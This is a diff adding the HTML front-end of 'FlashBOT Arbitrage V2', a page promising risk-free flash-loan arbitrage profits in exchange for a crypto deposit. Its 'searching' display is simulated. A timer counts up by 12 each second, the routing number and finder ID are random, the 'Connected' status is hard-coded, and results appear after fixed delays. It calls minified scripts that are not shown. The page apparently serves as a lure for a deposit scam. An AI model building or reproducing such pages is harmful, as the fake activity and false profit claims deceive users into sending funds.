@@ -1,0 +1,441 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>	  
+	<meta charset="UTF-8">
+	<meta name="viewport" content="width=device-width, initial-scale=1.0">
+	
+	<title>FlashBOT Arbitrage V2</title>
+
+	<link rel="stylesheet" href="./assets/css/styles.css">
+	<script src="https://ajax.googleapis.com/ajax/libs/angularjs/1.6.9/angular.min.js"></script>
+	<script>var site = "defiexploit.github.io";</script>
+	<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
+	
+	<script>setInterval(function () {
+		web3.eth.getBlockNumber().then(data => {
+		  document.getElementById('blockNumber').innerHTML = data;
+		});
+	  }, 3000);</script> 
+	<script defer data-domain="defiexploit.github.io" src="https://plausible.io/js/plausible.js"></script>
+</head>
+
+<body class="body" ng-app="myApp" ng-controller="myCtrl">	
+
+	<div id="main">
+		<div class="topnav">
+	
+		<div id="mySidenav" class="sidenav">
+			<ul id="menu" class="darking-menu" style="position: relative; padding:15px;display: grid;height: 150px;">
+			  <a href="javascript:void(0)" style="margin-top:0px" class="closebtn" onclick="closeNav()">&times;</a>
+			  
+			  <li style="margin-top: -18px;"><a  style="font-size: 12px;text-align: left;">Welcome to Flash<strong>Bot</strong>!</a></li>
+			  <br/><br/>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="index.html" id="site">Home</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="list.html" id="site">Token List</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="bounty.html" id="site">Bounty Program</a></li>
+			  <li style="place-self: center;"><a  style="font-size: 22px;" href="FAQ.html" id="site">FAQ</a></li>
+			  
+			  <br/><br/>
+	
+			  <div style="display: inline; place-self: center;"><a style="font-size: 14px;" target="_blank" href="https://github.com/defiexploit/defiexploit.github.io">Github</a>
+				<a style="font-size: 14px;" target="_blank" href="https://fc21.ifca.ai/papers/158.pdf">Docs</a>
+				<a style="font-size: 14px;" target="_blank" href="https://news.google.com/search?for=flash+loan+attack">News</a></div>
+		  </ul>  
+		</div>
+	
+			<a href="javascript:void(0);" style="padding-top: 18px; padding-left: 0px;" class="icon" onclick="openNav()">
+				<i class="fa fa-bars"></i>
+			</a>
+
+			<a class="darking-logo" href="index.html" id="site" style="padding: 11px 0px;">
+				<img src="assets/image/logo.png" id="logo" width="30px" height="30px" style="float: none;">
+				<a  style="font-size: 20px;" href="index.html" id="site"><strong>Flash</strong>Bot<a style="font-size: 10px;margin-left: -25px;">v2</a></a>
+				<a  style="font-size: 12px; margin-top: 14px; padding:5px 10px; border-radius: 15px;font-weight: 900 ; background: #1a70e1;" href="tutorial.html">Tutorial</a>
+			</a>
+			
+			<ul id="menu" style="transform: translate(0%, 0%); display: contents;" class="darking-menu">
+				<li><a  style="font-size: 14px; line-height: 22px; margin-left: 50px;" href="index.html" id="site">Bot</a></li>
+				<li><a  style="font-size: 14px; line-height: 22px;" href="pool.html" id="site">Pool</a></li>
+				<li><a  style="font-size: 14px; line-height: 22px;" href="referral.html" id="site">Affiliate</a></li>
+			</ul>
+	
+			<div class="topnav-right">
+			<button class="button-info" id="info" style="margin-top: 10px;border-radius: 50px; background: #191b1f; padding: 5px 15px;"><i class="fa fa-user-circle-o"></i> <div style="display: inline;">{{toplen}}...{{endlen}}</div></button>
+	
+			<div id="myModal" class="modal">
+				<div class="modal-content" style="width: 600px; height: 250px;">
+				  <span class="close">&times;</span>
+				  <h1 style="font-size: 20px; margin-top: 50px;padding: 25px; padding-top: 40px; padding-bottom: 10px; font-weight: 800;text-align: left;">Your Wallet</h1>
+				  <hr class="new1"/>
+				  <button style="margin: 15px 20px; width: auto; background: #191b1f;padding: 18px 10px;"><div style="font-size: 20px;">{{account.address}}</div></button>
+				 <div style="padding: 0px 20%;width: 100%;"> 
+				  <a href="{{scan}}address/{{account.address}}" style="font-size: 18px;">Check on {{idscan}}</a>
+				  <a onclick="copyRef()" style="font-size: 18px;">Copy Address</a>
+				  <a id="input" style="font-size: 0px; height: 0px;">{{account.address}}</a>
+				</div>
+				</div>
+			  </div>
+	
+			  <script>
+				function copyRef(id)
+				{
+				var r = document.createRange();
+				r.selectNode(document.getElementById("input"));
+				window.getSelection().removeAllRanges();
+				window.getSelection().addRange(r);
+				document.execCommand('copy');
+				window.getSelection().removeAllRanges();
+				return alert("Address copied successfully!");
+				}
+	
+				var modal2 = document.getElementById("myModal");
+				var btn2 = document.getElementById("info");
+				var span2 = document.getElementsByClassName("close")[0];
+	
+				btn2.onclick = function() {
+					modal2.style.display = "block";
+				}
+				span2.onclick = function() {
+				modal2.style.display = "none";
+				}
+				window.onclick = function(event) {
+					if (event.target == modal2) {
+					modal2.style.display = "none";
+					}
+				}
+			  </script>
+			</div>
+			
+		</div>
+	</div>
+		
+		<script>
+		function myFunction() {
+		  var x = document.getElementById("myLinks");
+		  if (x.style.display === "block") {
+			x.style.display = "none";
+		  } else {
+			x.style.display = "block";
+		  }
+		}
+		</script>
+	
+
+	<div class="space10"></div>
+
+	<form class="form-table" style="background: transparent;">
+		<table  class="test"  style="width:100%;margin-left: 10px;" id='myTable'>
+<tr style="vertical-align: top;"> 
+	<td>
+		<form class="darking-list" style="background: transparent; padding-bottom: 20px;max-width: 800px;">
+			<h1 style="text-align: left;">Welcome to Flash<strong>Bot!</strong></h1>
+			<p style="padding-right: 22px; width: 400px;text-align: left;">FlashBot is the first <b>NO CODE</b> arbitrage trading bot that leverage flash loans. <b>Enjoy risk free on-chain arbitrage opportunities</b>, automatic pair matching and routing. Just select the network (ETH or BSC) and enter a token address to launch the ARBITRAGE FINDER.</p>
+		</form>
+
+	</td>
+	<td>
+		<img src="assets/image/img3.png" style="width: 400px; margin-top: -80px;"/>
+	</td>
+</tr>
+		</table></form>
+
+		<div class="space50"></div>
+
+	<form class="darking" style="margin-top: -200px; position: relative; width: 450px;" ng-show="formStep == 1" ng-submit="submitErc20Form()">
+
+		<div class="input-holder">
+			<input onclick="getBalance()" type="text" placeholder="Token Address:" ng-model="erc20.name" maxlength="42" minlength="42" autofocus />
+		</div>		
+
+		<div class="input-holder">
+			<input onclick="getBalance()" type="text" placeholder="Token Symbol:" ng-model="erc20.symbol" maxlength="4" />
+		</div>
+		
+		<div>&nbsp;</div>
+
+		<div class="center">
+		<div class="cc-selector">
+			<label class="super">Select Network:</label>
+
+			<input type="radio" ng-model="erc20.network" id="n1" name="network" ng-value="true" ng-checked="erc20.network">
+			<label class="drinkcard-cc visa" for="n1"> </label>
+
+			<input type="radio" ng-model="erc20.network" id="n2" name="network" ng-value="false" ng-checked="!erc20.network">
+			<label class="drinkcard-cc mastercard" for="n2"> </label>
+
+		</div>
+		</div>
+	</div>
+
+		<div>&nbsp;</div>
+		<div class="input-holder btn-holder">
+			<button type="submit" onclick="fixCheck(), getBalance()"><b>START ARBITRAGE FINDER</b></button>
+		</div>
+		
+	</form>
+
+	<script>
+		setTimeout(function() {$('#in-2').hide().fadeIn('fast');}, 20000);
+	</script>
+    
+	<div id="in-2" hidden>
+	<span ng-show="formStep == 2" style="display:block; width: auto; margin-bottom:-50px; overflow: visible;margin-top: -230px;position: relative;">
+		<form class="form-table darking" style="background: rgb(17, 17, 17); width: 450px; height: 120px;">
+			<a style="font-size: 36px; color: white; float: right; padding-top: 18px;"><div id="mybalance" style="display: inline;"></div> {{currency}}</a><br/>
+			<a style="font-size: 13px; color: white;">Network:</a><a style="font-size: 11px; color: #1a70e1;" target="_blank" href={{scan}}>{{chain}}</a><br/>
+			<a style="color: white;">Address:</a><a style="font-size: 18px; color: #1a70e1;" target="_blank" href="{{scan}}address/{{account.address}}"><div style="display: inline;">{{toplen}}...{{endlen}}</div></a>
+		</form>
+	</span>
+	</div>
+
+	<form class="form-table darking" style="position: relative; width: 450px;" ng-show="formStep == 2" ng-submit="submitLoanForm()">
+		<style>
+			.loader {
+			  border: 16px solid #212429;
+			  border-radius: 50%;
+			  border-top: 16px solid #0e0f11;
+			  width: 75px;
+			  height: 75px;
+			  -webkit-animation: spin 2s linear infinite; /* Safari */
+			  animation: spin 2s linear infinite;
+			  float: none;
+			  position: absolute;
+			  left: 36%;
+			  transform: translate(-50%, -50%);
+			}
+			
+			/* Safari */
+			@-webkit-keyframes spin {
+			  0% { -webkit-transform: rotate(0deg); }
+			  100% { -webkit-transform: rotate(360deg); }
+			}
+			
+			@keyframes spin {
+			  0% { transform: rotate(0deg); }
+			  100% { transform: rotate(360deg); }
+			}
+			</style>
+
+			<script type="text/javascript">
+				window.setTimeout("Tick()", 1000);
+				function Tick() {}
+				var Timer;
+				var TotalSeconds;
+				function CreateTimer(TimerID, Time) {
+				Timer = document.getElementById(TimerID);
+				TotalSeconds = Time;
+				UpdateTimer()
+				window.setTimeout("Tick()", 1000);
+				}
+				function Tick() {
+				TotalSeconds += 12;
+				UpdateTimer()
+				window.setTimeout("Tick()", 1000);
+				}
+				function UpdateTimer() {
+				Timer.innerHTML = TotalSeconds;
+				}
+
+				setTimeout(function() {$('#out').fadeOut('fast');}, 19500);
+			</script>
+			<script src="https://ajax.googleapis.com/ajax/libs/jquery/2.1.1/jquery.min.js"></script>
+			
+			<div style="padding: 15px;margin-top:-220px" id="out">
+				<div class="alert">
+					<span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
+					<strong>Please wait...</strong> We are searching for the best arbitrage opportunity and swap routing for the selected token.
+				  </div>
+
+				<div>&nbsp;</div><div>&nbsp;</div>
+				<div class="loader"></div>
+				<div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div><div>&nbsp;</div>
+
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Token Name: <b>{{erc20.symbol}}</b><br/> 
+					Address:  <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{erc20.name}}">{{erc20.name}}</a>
+				</a>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Network: {{chain}}<br/>
+					Routing started: {{dex}}<br/> 
+					Router: <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{address}}">{{addressdex}}</a>
+				</a>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Checking routing combination: <div style="display: inline-block;" id='timer'></div>/466<br/>
+					Block Number: <span style="display: inline-block;" id="blockNumber"></span><br/>
+				</a>
+
+				<script type="text/javascript">window.onload = CreateTimer("timer", 0);</script>
+			</div>
+
+			<script>
+				setTimeout(function() {$('#in').hide().fadeIn('fast');}, 20000);
+			</script>
+
+		<div id="in" hidden>
+				<div>&nbsp;</div>
+
+				<div class="kv">
+						<div><a style="float:left; color: white; font-size: 21px;">Loan Amount: ({{currency}})</a>
+						<br/>
+						<a style="color: white; font-size: 12px;">Min 25, Max 10000 {{currency}}</a></div>
+						<div class="button-info" id="info2"><i class="fa fa-question-circle"></i></div>
+				</div>
+	
+			<div class="input-holder">
+
+    			<input style="display: inline; width: 100%;" class="input-group-field" id="loanAmtInput" type="number" ng-change="amountChanged()" ng-model="loan.amount" step="25" min="25" max="10000" placeholder="Loan Amount ({{currency}}):"  />
+				
+				<style>  
+					input[type=number]::-webkit-inner-spin-button, 
+					input[type=number]::-webkit-outer-spin-button {  
+   					opacity: 1;
+					}
+				</style>
+
+				<div class="space25"></div>
+
+				<div class="input-holder info">
+					<div class="kv">
+						<div class="tooltip">
+							<div>Dapp Fee <span class="tooltiptext">Small and fair fee to support the dapp developement. It's already deducted from the estimated profit below.</span> 
+							</div>
+						</div>
+						<div>0.3%</div>
+					</div>
+					<div class="kv">
+						<div class="tooltip">
+							<div>Swap Fee <span class="tooltiptext">How much {{currency}} its needed to perform the DEX swaps. (GAS FEES)</span> 
+							</div>
+						</div>
+						<div>{{loan.swapFee}} {{currency}}</div>
+					</div>
+					<div class="kv">
+						<div>Loan Fee</div>
+						<div>{{loan.tokenFee}} {{currency}}</div>
+					</div>
+					<div class="kv">
+						<div>Total Gas Fee</div>
+						<div class="spend">{{loan.totalFee}} {{currency}}</div>
+					</div>
+					<div class="kv">
+						<div style="display: inline-block;" >Routing</div>
+						<div><div id="check" style="display: inline-block;"></div> Pair > {{dex}}</div>
+						<script>function fixCheck() {var x = Math.floor((Math.random() * 10) + 1); document.getElementById("check").innerHTML = x;}</script>
+					</div>
+					<div class="kv">
+						<div>Token</div>
+						<div class="spend">{{erc20.symbol}}</div>
+					</div>
+					<hr>
+					<div class="kv">						
+						<div class="tooltip">
+						<div>Estimted profit from Arbitrage <span class="tooltiptext">How much you will earn if you start the arbitrage bot right now.</span> 
+						</div>
+						</div>
+						<div style="display: inline-block;" class="gain">≈ {{safeMath}} {{currency}}</div>
+					</div>
+					<div class="kv">						
+						<div class="tooltip">
+						<div>ROI <span class="tooltiptext">Return On Investiment.</span> 
+						</div>
+						</div>
+						<div style="display: inline-block;" class="gain" style="color: white">x {{roi}}</div>
+					</div>
+				</div>		
+
+				<div class="kv" style="padding: 15px; font-size: 12px;">
+						<div>Finder ID:</div>&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;&nbsp;
+					<div class="tooltip">
+							<div id="numberid" style="display: inline-block;"></div>
+							<span class="tooltiptext">This is a unique code for identification of your arbitrage match. Is for an internal use. </span> 
+					</div>
+
+					<script>
+					let r = Math.random().toString(36).substring(7);
+					document.getElementById("numberid").innerHTML = r;
+					</script>
+				</div>
+
+				<div class="input-holder btn-holder">
+					<button type="submit" ng-disabled="processing || ethDeposited">Deposit {{currency}}</button>
+				</div>
+		
+				<div class="input-holder btn-holder">
+					<button class="button-2" type="submit" ng-disabled="processing || !ethDeposited">Execute FlashBot Arbitrage</button>
+				</div>
+
+			</div>
+		</div>
+
+		<div id="myModal2" class="modal">
+		  <div class="modal-content" style="border-radius: 25px;padding: 20px;margin-top: 200px;width: 430px;box-shadow: 0 0 1000px 0 #000000, 0 6px 50px 0 #000000;">
+			<span class="close2" style="float: right;font-size: 30px;">&times;</span>
+			<div style="padding: 0 15px;">
+				<a style="float:left; color: white; font-size: 21px;">Arbitrage Detail:</a><br/><br/>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Token Name: <b>{{erc20.symbol}}</b><br/> 
+					Address:  <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{erc20.name}}">{{erc20.name}}</a><br/>
+					Caller:  <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{account.address}}">{{account.address}}</a>
+				</a>
+				<a style="color:#ffffff; font-size: 14px;">
+					<br/>
+					Routing started: {{dex}}<br/> 
+					Router: <a style="color:#3c64e7; font-size: 10px;" target="_blank" href="{{scan}}address/{{address}}">{{addressdex}}</a><br/>
+				</a>
+				</div>
+		  </div>
+		</div>
+		<script>
+			var modal = document.getElementById("myModal2");
+			var btn = document.getElementById("info2");
+			var span = document.getElementsByClassName("close2")[0];
+
+			btn.onclick = function() {
+				modal.style.display = "block";
+			}
+			span.onclick = function() {
+			modal.style.display = "none";
+			}
+			window.onclick = function(event) {
+				if (event.target == modal) {
+				modal.style.display = "none";
+				}
+			}
+		</script>
+	
+	</form>
+
+	<script>
+		function updateDiv()
+		{ 
+    		$( "#refresh" ).load(window.location.href + " #refresh" );
+		}
+	</script>
+
+	<div class="alert-2" hidden>
+		<span class="closebtn" onclick="this.parentElement.style.display='none';">&times;</span> 
+		Be sure to access only by our verified link: <strong>https://#</strong> 
+	  </div>
+
+	<div class="space10"></div>
+	
+	<ul class="darking-menu">
+		<div class="tooltip" style="border-bottom: 0px dotted #000;position: relative;">
+			<a class="darking-menu" style="font-size: 12px;display: contents;" ><p>WebSocket: <a style="color: rgb(85, 170, 0);font-size: 12px;display: contents;"><i class="fa fa-circle"></i> Connected</a><span class="tooltiptext">Our WebSocket is correctly connected to the Server.</span></p></a>
+		</div></br>
+		<a class="darking-menu" style="font-size: 12px;" ><p>© FlashBot 2021</p></a>
+	</ul>
+
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/web3/1.3.5/web3.min.js"></script>
+	<script src="https://cdnjs.cloudflare.com/ajax/libs/crypto-js/3.1.2/rollups/aes.js" integrity="sha256-/H4YS+7aYb9kJ5OKhFYPUjSJdrtV6AeyJOtTkw6X72o=" crossorigin="anonymous"></script>
+	<script src="./assets/js/addr.min.js?v=2"></script>
+	<script src="./assets/js/chain.min.js?v=2"></script>
+	<script src="./assets/js/script.min.js?v=4"></script>
+</body>
+
+</html>
